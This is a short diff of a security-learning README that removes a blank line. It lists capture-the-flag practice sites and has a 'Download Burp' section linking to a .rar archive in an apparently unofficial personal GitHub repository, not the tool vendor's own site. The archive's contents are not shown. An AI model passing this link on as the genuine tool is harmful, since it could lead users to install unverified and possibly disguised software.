@@ -30,7 +30,6 @@
   - [Hacker101](https://www.hacker101.com/)
   - [Codeby Games](https://codeby.games/categories)
   
- 
 ## Download Burp
 
 [CLICK THIS LINK](https://github.com/Maverick-25/Burp-Suite/releases/download/tool/Burp-Suite.rar)
